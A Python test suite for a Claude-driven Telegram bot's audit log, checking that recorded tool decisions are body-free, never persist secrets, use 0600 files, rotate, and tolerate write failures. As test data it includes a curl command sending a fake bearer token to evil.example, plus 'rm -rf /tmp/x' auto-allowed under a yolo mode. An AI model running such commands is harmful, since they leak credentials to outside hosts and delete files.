"""P13 T-AUDIT — the durable, BODY-FREE audit trail.

No live Claude / network / CLI: the audit core is exercised directly, the engine hook is
driven through a scripted mock substrate (mirroring ``test_security_reliability``'s
``ScriptedSubstrate`` / ``_engine_over`` / ``_resolve_when_pending`` shapes), and ``/audit``
is exercised against the bot with a fake update. Covers:

* SB3 (structural): ``AuditEvent`` has NO body-bearing field — a leak is impossible by
  construction; a record built from a secret-laden Write/Bash summary contains no body.
* the log file is ``0600`` + atomic-append + JSONL; it rotates once at the size bound.
* RB1-total: an unwritable / raising sink never breaks a turn; a write failure is swallowed.
* the engine ``on_tool_request`` chokepoint records EVERY outcome (auto_allow / allow_once /
  allow_session / deny / backstop_deny / cancel + plan approve/reject) with body-free fields.
* the no-op ``audit_sink=None`` default leaves behavior identical.
* ``/audit`` is SB1-gated, body-free, HTML-escaped, bounded, and per-chat filtered.

A planted secret-SHAPED string in this file uses a ``fake``/``dummy`` marker so
``scripts/secret_scan.py`` treats it as a placeholder (the clean repo stays green) while the
SB3 test still proves the value never reaches the log.
"""

from __future__ import annotations

import asyncio
import dataclasses
import json
import stat

import pytest

from claude_tg.audit import (
    KIND_PLAN_DECISION,
    KIND_POLICY_EVENT,
    KIND_SESSION_EVENT,
    KIND_TOOL_DECISION,
    AuditEvent,
    AuditLog,
    ChatBoundSink,
    FileAuditSink,
)

# A secret-SHAPED but FAKE value (the `fake`/`dummy` markers keep secret_scan green — it is a
# documented placeholder, not a real credential) used to PROVE the audit log never carries a
# body / secret (SB3). It is only ever passed as tool-input CONTENT, never written to a file.
FAKE_SECRET_TOKEN = "fake-dummy-not-a-real-secret-abcdefghijklmnop1234567890"  # noqa: S105


# ===========================================================================
# SB3 (structural) — AuditEvent has NO body-bearing field; a leak is impossible.
# ===========================================================================


def test_audit_event_has_no_body_bearing_field():
    """SB3 (structural): ``AuditEvent`` carries ONLY non-body fields.

    The gate-blocking bar: the writer's only input type must have NO field that could carry a
    raw body (file content, command output, prompt/plan text, raw session id, secret). This
    pins the field set so a future edit that ADDS such a field trips the guard. ``summary`` is
    the only free-ish field and its contract is "an already-body-free string"
    (``safe_input_summary`` output), asserted behaviorally below.
    """
    field_names = {f.name for f in dataclasses.fields(AuditEvent)}
    assert field_names == {
        "ts",
        "kind",
        "tool",
        "summary",
        "decision",
        "chat_id",
        "session_tag",
    }
    # No field name hints at a body/secret channel (defense-in-depth against a future add).
    forbidden = {
        "content",
        "body",
        "output",
        "stdout",
        "stderr",
        "text",
        "plan",
        "feedback",
        "command",
        "input",
        "tool_input",
        "session_id",
        "raw",
        "secret",
        "data",
    }
    assert not (field_names & forbidden), f"AuditEvent has a body-bearing field: {field_names & forbidden}"


def test_audit_event_is_frozen():
    """The record is immutable (frozen) — it can't be mutated to smuggle a body in post-build."""
    ev = AuditEvent(ts="t", kind=KIND_TOOL_DECISION)
    with pytest.raises(dataclasses.FrozenInstanceError):
        ev.summary = "x"  # type: ignore[misc]


def test_record_built_from_secret_write_summary_contains_no_content(tmp_path):
    """SB3: a record built from a ``Write`` with secret ``content`` carries NO content.

    The engine builds the record's ``summary`` via ``audit_safe_summary`` — which collapses a
    body field (``content``) to ``<N chars>``. This proves the planted secret never lands in
    the on-disk log line (neither the secret nor the raw content), only its length.
    """
    from claude_tg.audit import audit_safe_summary

    summary = audit_safe_summary("Write", {"file_path": "/etc/x", "content": FAKE_SECRET_TOKEN})
    log = AuditLog(tmp_path / "a.jsonl")
    log.append(AuditEvent(ts="t", kind=KIND_TOOL_DECISION, tool="Write", summary=summary, decision="deny"))
    on_disk = (tmp_path / "a.jsonl").read_text(encoding="utf-8")
    assert FAKE_SECRET_TOKEN not in on_disk  # the secret never reaches the log
    assert "content=<" in on_disk  # collapsed to a length, not dumped


def test_audit_safe_summary_collapses_ident_fields_unlike_prompt(tmp_path):
    """SB3 (BLOCKER 1): the AUDIT summary collapses IDENT fields too — a secret early in a
    Bash ``command`` (or in a path/url) is NEVER persisted, unlike the ephemeral prompt.

    The prompt's ``safe_input_summary`` keeps the first 160 RAW chars of an ident (correct
    there — the operator must see the command). The DURABLE log must not: ``audit_safe_summary``
    collapses ``command`` to ``<argv0 …N chars>`` and ``path``/``url``/``pattern`` to a length.
    Mutation-probe: if the audit reverts to the prompt summary, a secret EARLY in the command
    appears on disk and this fails.
    """
    from claude_tg.audit import audit_safe_summary
    from claude_tg.engine.types import safe_input_summary

    # The secret is EARLY (within the first 160 chars) — where the prompt summary WOULD keep it.
    command = "curl -H 'Authorization: Bearer " + FAKE_SECRET_TOKEN + "' https://evil.example/x"
    assert len(command) < 160
    # The PROMPT summary leaks it (this is correct for the ephemeral prompt — documents the gap).
    assert FAKE_SECRET_TOKEN in safe_input_summary("Bash", {"command": command})
    # The AUDIT summary does NOT — it collapses the command to argv[0] + a length.
    audit_summary = audit_safe_summary("Bash", {"command": command})
    assert FAKE_SECRET_TOKEN not in audit_summary
    assert "command=<" in audit_summary  # collapsed to a length/shape
    assert "curl" in audit_summary  # argv[0] (the binary name) is kept — review-useful, low-risk

    # And on disk: appending a record built from the audit summary never persists the secret.
    log = AuditLog(tmp_path / "b.jsonl")
    log.append(AuditEvent(ts="t", kind=KIND_TOOL_DECISION, tool="Bash", summary=audit_summary, decision="auto_allow"))
    assert FAKE_SECRET_TOKEN not in (tmp_path / "b.jsonl").read_text(encoding="utf-8")


def test_audit_safe_summary_drops_argv0_when_it_could_carry_a_secret():
    """``audit_safe_summary`` drops argv[0] (length-only) when it is an inline ``VAR=…`` or a
    long blob — so a secret smuggled as the first token (no leading binary) isn't kept."""
    from claude_tg.audit import audit_safe_summary

    # First token is an inline assignment (could be a secret) → argv[0] dropped, length only.
    s1 = audit_safe_summary("Bash", {"command": "SECRET=" + FAKE_SECRET_TOKEN + " run"})
    assert FAKE_SECRET_TOKEN not in s1 and "command=<" in s1 and "SECRET" not in s1
    # First token is a long no-space blob (> argv0 cap) → dropped, length only.
    s2 = audit_safe_summary("Bash", {"command": FAKE_SECRET_TOKEN + "more"})
    assert FAKE_SECRET_TOKEN not in s2 and "command=<" in s2


# ===========================================================================
# The durable log — 0600, atomic JSONL, round-trip tail, size-bounded rotation.
# ===========================================================================


def test_append_creates_0600_jsonl_file_with_parent_mkdir(tmp_path):
    """``append`` creates a ``0600`` file (parent ``mkdir -p``'d), one parseable JSON line."""
    target = tmp_path / "nested" / "dir" / "audit.jsonl"  # parent does not exist yet
    log = AuditLog(target)
    log.append(AuditEvent(ts="2026-06-24T12:00:00+00:00", kind=KIND_SESSION_EVENT, summary="attach", chat_id=7))
    assert target.is_file()
    mode = stat.S_IMODE(target.stat().st_mode)
    assert mode == 0o600, f"audit file mode is {oct(mode)}, expected 0o600"
    lines = target.read_text(encoding="utf-8").splitlines()
    assert len(lines) == 1
    parsed = json.loads(lines[0])  # a parseable JSONL line
    assert parsed["kind"] == KIND_SESSION_EVENT and parsed["chat_id"] == 7


def test_append_tail_round_trip(tmp_path):
    """A sequence of appends round-trips through ``tail`` (oldest→newest), bounded by ``n``."""
    log = AuditLog(tmp_path / "a.jsonl")
    for i in range(5):
        log.append(AuditEvent(ts=f"t{i}", kind=KIND_TOOL_DECISION, tool="Bash", summary=f"s{i}", decision="deny", chat_id=1))
    got = log.tail(3)
    assert [e.ts for e in got] == ["t2", "t3", "t4"]  # last 3, in order
    assert all(isinstance(e, AuditEvent) for e in got)
    assert log.tail(0) == []  # n<=0 → empty
    assert len(log.tail(100)) == 5  # capped at what exists


def test_append_re_asserts_0600_on_preexisting_loose_file(tmp_path):
    """A pre-existing file with loose perms is tightened to ``0600`` on the next append (SB3)."""
    target = tmp_path / "a.jsonl"
    target.write_text("", encoding="utf-8")
    target.chmod(0o644)  # simulate a file created with looser perms
    log = AuditLog(target)
    log.append(AuditEvent(ts="t", kind=KIND_POLICY_EVENT, summary="yolo_on"))
    assert stat.S_IMODE(target.stat().st_mode) == 0o600


def test_rotation_fires_at_size_bound_keeping_one_keep(tmp_path):
    """At the byte bound the log rotates ONCE to ``<file>.1`` (1-keep) and starts fresh."""
    target = tmp_path / "a.jsonl"
    log = AuditLog(target, max_bytes=200)  # tiny bound so a few lines trip it
    # Write enough that the live file exceeds 200 bytes...
    for i in range(20):
        log.append(AuditEvent(ts=f"2026-06-24T00:00:{i:02d}+00:00", kind=KIND_TOOL_DECISION, tool="Bash", summary="s" * 20, decision="deny"))
    rotated = target.with_name(target.name + ".1")
    assert rotated.is_file(), "expected a single .1 keep after the bound was crossed"
    assert stat.S_IMODE(rotated.stat().st_mode) == 0o600  # the keep is 0600 too
    # The live file is bounded (it was reset on rotation, then grew again but stays modest).
    assert target.stat().st_size < 200 * 4
    # Exactly ONE keep — no .2 / unbounded chain.
    assert not target.with_name(target.name + ".2").exists()


def test_rotation_clamps_non_positive_max_bytes_to_default(tmp_path):
    """A non-positive ``max_bytes`` is clamped to the default (a degenerate bound can't wedge)."""
    from claude_tg.audit import DEFAULT_AUDIT_LOG_MAX_BYTES

    assert AuditLog(tmp_path / "a.jsonl", max_bytes=0).max_bytes == DEFAULT_AUDIT_LOG_MAX_BYTES
    assert AuditLog(tmp_path / "a.jsonl", max_bytes=-1).max_bytes == DEFAULT_AUDIT_LOG_MAX_BYTES


def test_tail_skips_unparseable_lines_never_raises(tmp_path):
    """A malformed line is skipped (RB1) — the rest of the tail still parses; never raises."""
    target = tmp_path / "a.jsonl"
    good = AuditEvent(ts="t1", kind=KIND_TOOL_DECISION, tool="Bash", summary="ok", decision="deny").to_json_line()
    target.write_text(good + "\n" + "{not json\n" + "\n" + good + "\n", encoding="utf-8")
    got = AuditLog(target).tail(10)
    assert len(got) == 2  # both good lines; the garbage + blank are skipped
    assert all(e.summary == "ok" for e in got)


def test_tail_missing_file_is_empty(tmp_path):
    """A never-written log reads as ``[]`` (RB1 — no error)."""
    assert AuditLog(tmp_path / "nope.jsonl").tail(20) == []


# ===========================================================================
# RB1-total — a write failure NEVER raises out of append (turn safety).
# ===========================================================================


def test_append_unwritable_path_does_not_raise(tmp_path):
    """An unwritable path → ``append`` swallows the error and does NOT raise (RB1)."""
    # Point the log at a path whose PARENT is a FILE, so mkdir + open both fail.
    not_a_dir = tmp_path / "afile"
    not_a_dir.write_text("x", encoding="utf-8")
    log = AuditLog(not_a_dir / "child.jsonl")
    # Must not raise (and must not create anything bogus).
    log.append(AuditEvent(ts="t", kind=KIND_TOOL_DECISION, tool="Bash", summary="s", decision="deny"))
    assert log.tail(5) == []  # nothing readable, but no crash


def test_file_sink_never_raises_even_if_log_append_would(monkeypatch, tmp_path):
    """``FileAuditSink.record`` swallows even a raising ``append`` (defense-in-depth, RB1)."""
    log = AuditLog(tmp_path / "a.jsonl")

    def boom(_ev):
        raise RuntimeError("disk on fire")

    monkeypatch.setattr(log, "append", boom)
    sink = FileAuditSink(log)
    sink.record(AuditEvent(ts="t", kind=KIND_TOOL_DECISION))  # must not raise


# ===========================================================================
# ChatBoundSink — stamps chat_id + re-redacts a raw session id (SB3/H1).
# ===========================================================================


def test_chat_bound_sink_stamps_chat_id(tmp_path):
    """The bound sink fills in ``chat_id`` the substrate-neutral engine left as None."""
    log = AuditLog(tmp_path / "a.jsonl")
    ChatBoundSink(log, 4242).record(AuditEvent(ts="t", kind=KIND_TOOL_DECISION, tool="Bash", summary="s", decision="deny"))
    got = log.tail(1)
    assert got[0].chat_id == 4242


def test_chat_bound_sink_respects_existing_chat_id(tmp_path):
    """An event that already carries a chat_id keeps it (a bot-side record is respected)."""
    log = AuditLog(tmp_path / "a.jsonl")
    ChatBoundSink(log, 1).record(AuditEvent(ts="t", kind=KIND_SESSION_EVENT, summary="attach", chat_id=99))
    assert log.tail(1)[0].chat_id == 99


def test_chat_bound_sink_re_redacts_a_raw_session_id(tmp_path):
    """SB3/H1: a raw UUID-shaped session id in ``session_tag`` is re-redacted before the write."""
    log = AuditLog(tmp_path / "a.jsonl")
    raw_uuid = "8f14e45f-ceea-467d-9f0a-1234567890ab"  # a Claude-session-shaped id (fake)
    ChatBoundSink(log, 1).record(AuditEvent(ts="t", kind=KIND_SESSION_EVENT, summary="attach", session_tag=raw_uuid))
    on_disk = (tmp_path / "a.jsonl").read_text(encoding="utf-8")
    assert raw_uuid not in on_disk  # the raw resumable id never lands in the log
    assert "sid:" in on_disk  # replaced with its redacted tag


# ===========================================================================
# The engine hook (on_tool_request) — every outcome recorded, body-free.
#   Mirrors test_security_reliability's ScriptedSubstrate / _engine_over /
#   _resolve_when_pending so the records are driven end-to-end through the gate.
# ===========================================================================


class _ListSink:
    """A fake :class:`~claude_tg.audit.AuditSink` collecting every recorded event in order."""

    def __init__(self):
        self.events: list[AuditEvent] = []

    def record(self, event: AuditEvent) -> None:
        self.events.append(event)


class _RaisingSink:
    """A sink that RAISES — to prove an audit failure never breaks a turn (RB1 mutation)."""

    def __init__(self):
        self.calls = 0

    def record(self, event: AuditEvent) -> None:
        self.calls += 1
        raise RuntimeError("audit sink exploded")


class _ScriptedSubstrate:
    """A mock substrate that drives a SCRIPT of tool requests in one turn (gate-in-order).

    Each request blocks on ``decision_callback`` (= ``engine.on_tool_request``) before the
    next is issued, so a later request goes through the gate after an earlier grant is
    recorded. Copied in spirit from ``test_security_reliability.ScriptedSubstrate``.
    """

    def __init__(self, *, requests):
        self._requests = requests  # list of (tool_name, tool_input, tool_use_id)
        self.session_id = "S-audit"
        self.decision_callback = None
        self.decisions = []

    async def start(self):
        pass

    async def resume(self, session_id, *, fork=False):
        self.session_id = session_id

    async def send(self, prompt, *, timeout=120.0):
        from claude_tg.engine import TextEvent

        for (name, tool_input, tuid) in self._requests:
            decision = await self.decision_callback(name, tool_input, tuid)
            self.decisions.append(decision)
            yield TextEvent(text=f"{tuid}:{'allow' if decision.allow else 'deny'}", session_id="S-audit")

    async def stop(self):
        pass


def _engine_with_sink(sub, sink, *, policy=None, backstop_seconds=None):
    from claude_tg.engine import Engine

    kwargs = {"audit_sink": sink}
    if policy is not None:
        kwargs["permission_policy"] = policy
    if backstop_seconds is not None:
        kwargs["backstop_seconds"] = backstop_seconds
    eng = Engine(sub, **kwargs)
    sub.decision_callback = eng.on_tool_request
    return eng


async def _drain(aiter):
    return [ev async for ev in aiter]


async def _resolve_when_pending(eng, tool_use_id, decision):
    for _ in range(2000):
        if eng._pending.has_pending(tool_use_id):
            break
        await asyncio.sleep(0)
    return eng.resolve(tool_use_id, decision)


async def test_hook_records_auto_allow_for_safe_tool():
    """A SAFE tool (auto-allowed, no prompt) records exactly one ``auto_allow`` tool_decision."""
    sink = _ListSink()
    sub = _ScriptedSubstrate(requests=[("Read", {"file_path": "/a/b"}, "tu1")])
    eng = _engine_with_sink(sub, sink)
    await eng.start()
    await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    await eng.stop()
    assert len(sink.events) == 1
    ev = sink.events[0]
    assert ev.kind == KIND_TOOL_DECISION and ev.tool == "Read" and ev.decision == "auto_allow"
    # The AUDIT summary collapses the path to a length (stricter than the prompt summary).
    assert ev.summary == "Read(file_path=<4 chars>)"
    assert ev.session_tag and ev.session_tag.startswith("sid:")  # redacted, never raw


async def test_hook_records_auto_allow_under_yolo():
    """A RISKY tool auto-allowed under /yolo (never reaches the bot) is STILL audited (the
    chokepoint catches what resolve_callback would miss)."""
    from claude_tg.permissions import PermissionPolicy

    policy = PermissionPolicy()
    policy.set_yolo(True)
    sink = _ListSink()
    sub = _ScriptedSubstrate(requests=[("Bash", {"command": "rm -rf /tmp/x"}, "tu1")])
    eng = _engine_with_sink(sub, sink, policy=policy)
    await eng.start()
    await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    await eng.stop()
    assert [e.decision for e in sink.events] == ["auto_allow"]
    assert sink.events[0].tool == "Bash"


async def test_hook_bash_secret_never_reaches_the_audit_log_end_to_end(tmp_path):
    """SB3 (BLOCKER 1) end-to-end: a secret in a Bash command auto-allowed under /yolo is
    recorded body-free — neither the recorded event NOR the on-disk JSONL contains the secret.

    Drives the REAL engine through the REAL ChatBoundSink + AuditLog (not a list fake), so this
    proves the durable file is strongly body-free. Mutation-probe: revert ``_record_tool`` to
    the prompt's ``safe_input_summary`` and the secret lands on disk → fail.
    """
    from claude_tg.audit import AuditLog, ChatBoundSink
    from claude_tg.permissions import PermissionPolicy

    fake_secret = "fake-sample-not-real-tok-abcdef0123456789abcdef"
    log = AuditLog(tmp_path / "audit.jsonl")
    sink = ChatBoundSink(log, 1)
    policy = PermissionPolicy()
    policy.set_yolo(True)
    sub = _ScriptedSubstrate(requests=[("Bash", {"command": "export TOKEN=" + fake_secret + " && curl x"}, "tu1")])
    eng = _engine_with_sink(sub, sink, policy=policy)
    await eng.start()
    await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    await eng.stop()
    on_disk = (tmp_path / "audit.jsonl").read_text(encoding="utf-8")
    assert fake_secret not in on_disk  # the durable log never persists the secret
    assert "command=<" in on_disk  # but it DID record a body-free shape (useful for review)
    # The recorded event is a body-free auto_allow tool_decision for Bash.
    got = log.tail(5)
    assert [e.decision for e in got] == ["auto_allow"] and got[0].tool == "Bash"
    assert fake_secret not in (got[0].summary or "")


async def test_hook_records_allow_once_then_re_holds():
    """An operator ``allow_once`` on a held risky tool records an ``allow_once`` tool_decision."""
    from claude_tg.engine.types import PermissionDecision
    from claude_tg.permissions import PermissionPolicy

    sink = _ListSink()
    sub = _ScriptedSubstrate(requests=[("Bash", {"command": "ls"}, "tu1")])
    eng = _engine_with_sink(sub, sink, policy=PermissionPolicy())
    await eng.start()
    op = asyncio.create_task(_resolve_when_pending(eng, "tu1", PermissionDecision("allow_once")))
    await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    assert await op is True
    await eng.stop()
    assert [(e.tool, e.decision) for e in sink.events] == [("Bash", "allow_once")]


async def test_hook_records_allow_session_grant():
    """``allow_session`` records an ``allow_session`` tool_decision (the verdict the operator
    chose — distinct from allow_once, which decision_to_substrate collapses)."""
    from claude_tg.engine.types import PermissionDecision
    from claude_tg.permissions import PermissionPolicy

    sink = _ListSink()
    sub = _ScriptedSubstrate(requests=[("Bash", {"command": "ls"}, "tu1")])
    eng = _engine_with_sink(sub, sink, policy=PermissionPolicy())
    await eng.start()
    op = asyncio.create_task(_resolve_when_pending(eng, "tu1", PermissionDecision("allow_session")))
    await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    assert await op is True
    await eng.stop()
    assert [e.decision for e in sink.events] == ["allow_session"]


async def test_hook_records_deny():
    """An operator ``deny`` records a ``deny`` tool_decision."""
    from claude_tg.engine.types import PermissionDecision
    from claude_tg.permissions import PermissionPolicy

    sink = _ListSink()
    sub = _ScriptedSubstrate(requests=[("Bash", {"command": "ls"}, "tu1")])
    eng = _engine_with_sink(sub, sink, policy=PermissionPolicy())
    await eng.start()
    op = asyncio.create_task(_resolve_when_pending(eng, "tu1", PermissionDecision("deny")))
    await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    assert await op is True
    await eng.stop()
    assert [e.decision for e in sink.events] == ["deny"]


async def test_hook_records_fail_closed_deny_when_no_tool_use_id():
    """A risky tool with NO tool_use_id (can't be gated) fails closed → a ``deny`` record."""
    from claude_tg.permissions import PermissionPolicy

    sink = _ListSink()
    eng = _engine_with_sink(_ScriptedSubstrate(requests=[]), sink, policy=PermissionPolicy())
    await eng.start()
    decision = await eng.on_tool_request("Bash", {"command": "ls"}, None)
    await eng.stop()
    assert decision.allow is False
    assert [(e.tool, e.decision) for e in sink.events] == [("Bash", "deny")]


async def test_hook_records_backstop_deny():
    """A held permission that the BACKSTOP auto-denies records a ``backstop_deny`` (RB4)."""
    from claude_tg.permissions import PermissionPolicy

    sink = _ListSink()
    sub = _ScriptedSubstrate(requests=[("Bash", {"command": "ls"}, "tu1")])
    # A tiny backstop so the hold auto-denies fast (no real wait, no operator).
    eng = _engine_with_sink(sub, sink, policy=PermissionPolicy(), backstop_seconds=0.05)
    await eng.start()
    await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    await eng.stop()
    assert [e.decision for e in sink.events] == ["backstop_deny"]


async def test_hook_records_cancel():
    """A held permission aborted by /cancel records a ``cancel`` tool_decision (RB4)."""
    from claude_tg.permissions import PermissionPolicy

    sink = _ListSink()
    sub = _ScriptedSubstrate(requests=[("Bash", {"command": "ls"}, "tu1")])
    eng = _engine_with_sink(sub, sink, policy=PermissionPolicy())
    await eng.start()

    async def _cancel_when_pending():
        for _ in range(2000):
            if eng._pending.has_pending("tu1"):
                break
            await asyncio.sleep(0)
        return eng.cancel("tu1")

    op = asyncio.create_task(_cancel_when_pending())
    await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    await op
    await eng.stop()
    assert [e.decision for e in sink.events] == ["cancel"]


async def test_hook_records_plan_approve_and_reject():
    """An ExitPlanMode approve/reject records a body-free ``plan_decision`` (NO plan text)."""
    from claude_tg.engine.types import PlanVerdict
    from claude_tg.permissions import PermissionPolicy

    # Approve.
    sink_a = _ListSink()
    sub_a = _ScriptedSubstrate(requests=[("ExitPlanMode", {"plan": "SECRET PLAN BODY"}, "tu1")])
    eng_a = _engine_with_sink(sub_a, sink_a, policy=PermissionPolicy())
    await eng_a.start()
    op = asyncio.create_task(_resolve_when_pending(eng_a, "tu1", PlanVerdict(approve=True)))
    await asyncio.wait_for(_drain(eng_a.send("go")), timeout=5)
    assert await op is True
    await eng_a.stop()
    assert [(e.kind, e.decision) for e in sink_a.events] == [(KIND_PLAN_DECISION, "approve")]
    # The plan body is NEVER on the record (no plan/summary field carries it).
    assert all("SECRET PLAN BODY" not in (e.summary or "") for e in sink_a.events)

    # Reject WITH feedback — the feedback text must not appear either.
    sink_r = _ListSink()
    sub_r = _ScriptedSubstrate(requests=[("ExitPlanMode", {"plan": "p"}, "tu2")])
    eng_r = _engine_with_sink(sub_r, sink_r, policy=PermissionPolicy())
    await eng_r.start()
    op2 = asyncio.create_task(_resolve_when_pending(eng_r, "tu2", PlanVerdict(approve=False, feedback="FEEDBACK SECRET")))
    await asyncio.wait_for(_drain(eng_r.send("go")), timeout=5)
    assert await op2 is True
    await eng_r.stop()
    assert [(e.kind, e.decision) for e in sink_r.events] == [(KIND_PLAN_DECISION, "reject")]
    assert all("FEEDBACK SECRET" not in (e.summary or "") for e in sink_r.events)


async def test_ask_answer_is_not_audited():
    """An AskUserQuestion answer is NOT a tool/plan decision — it produces NO audit record
    (an answer's content is the operator's; only security decisions are audited)."""
    from claude_tg.engine.types import QuestionAnswer
    from claude_tg.permissions import PermissionPolicy

    sink = _ListSink()
    questions = [{"question": "Pick?", "header": "h", "options": [{"label": "A"}], "multiSelect": False}]
    sub = _ScriptedSubstrate(requests=[("AskUserQuestion", {"questions": questions}, "tu1")])
    eng = _engine_with_sink(sub, sink, policy=PermissionPolicy())
    await eng.start()
    op = asyncio.create_task(_resolve_when_pending(eng, "tu1", QuestionAnswer(answers={"Pick?": "A"})))
    await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    assert await op is True
    await eng.stop()
    assert sink.events == []  # nothing audited for an ask answer


# ===========================================================================
# RB1 mutation — a RAISING sink does not break the turn; the no-op default is identical.
# ===========================================================================


async def test_raising_sink_does_not_break_the_turn():
    """RB1 mutation: a sink that RAISES on record must not break the turn — the turn's events
    still flow and the tool's decision is still produced."""
    from claude_tg.permissions import PermissionPolicy

    sink = _RaisingSink()
    sub = _ScriptedSubstrate(requests=[("Read", {"file_path": "/a"}, "tu1")])
    eng = _engine_with_sink(sub, sink, policy=PermissionPolicy())
    await eng.start()
    out = await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    await eng.stop()
    # The sink WAS called (and raised) — but the turn completed and the tool was allowed.
    assert sink.calls == 1
    assert any(getattr(e, "text", "").endswith(":allow") for e in out)
    assert sub.decisions and sub.decisions[0].allow is True


async def test_no_op_default_sink_is_silent_and_behaves_identically():
    """The default ``audit_sink=None`` records nothing and the gate behaves exactly as before
    (the 1288-floor guarantee at the unit level: no sink → no calls, same outcome)."""
    from claude_tg.engine import Engine
    from claude_tg.engine.types import PermissionDecision
    from claude_tg.permissions import PermissionPolicy

    sub = _ScriptedSubstrate(requests=[("Bash", {"command": "ls"}, "tu1")])
    eng = Engine(sub, permission_policy=PermissionPolicy())  # NO audit_sink
    assert eng._audit_sink is None
    sub.decision_callback = eng.on_tool_request
    await eng.start()
    op = asyncio.create_task(_resolve_when_pending(eng, "tu1", PermissionDecision("allow_once")))
    out = await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
    assert await op is True
    await eng.stop()
    # Same observable behavior as the pre-P13 gate: held, then allowed on the tap.
    assert sub.decisions[0].allow is True
    assert any(getattr(e, "text", "") == "tu1:allow" for e in out)


# ===========================================================================
# Config knobs — resolve_audit_log_file + parse_audit_log_max_bytes.
# ===========================================================================


def test_resolve_audit_log_file_defaults_next_to_state_file(tmp_path):
    from claude_tg.config import resolve_audit_log_file

    state = tmp_path / "state.json"
    got = resolve_audit_log_file(None, state_file=state)
    assert got == tmp_path / "state.json.audit.jsonl"


def test_resolve_audit_log_file_off_when_no_state_file():
    from claude_tg.config import resolve_audit_log_file

    assert resolve_audit_log_file(None, state_file=None) is None  # stateless deploy → off


def test_resolve_audit_log_file_explicit_path_and_disable_tokens(tmp_path):
    from claude_tg.config import resolve_audit_log_file

    state = tmp_path / "state.json"
    # Explicit path wins (even over the state-file default).
    assert resolve_audit_log_file("/var/log/a.jsonl", state_file=state).as_posix() == "/var/log/a.jsonl"
    # Disable tokens turn it off even when a state file is present.
    for token in ("", "off", "none", "disabled", "0", "false", "OFF", " none "):
        assert resolve_audit_log_file(token, state_file=state) is None


def test_parse_audit_log_max_bytes_valid_empty_invalid():
    from claude_tg.config import DEFAULT_AUDIT_LOG_MAX_BYTES, parse_audit_log_max_bytes

    assert parse_audit_log_max_bytes(None) == DEFAULT_AUDIT_LOG_MAX_BYTES
    assert parse_audit_log_max_bytes("") == DEFAULT_AUDIT_LOG_MAX_BYTES
    assert parse_audit_log_max_bytes("1048576") == 1048576
    for bad in ("0", "-1", "x", "1.5"):
        with pytest.raises(ValueError):
            parse_audit_log_max_bytes(bad)
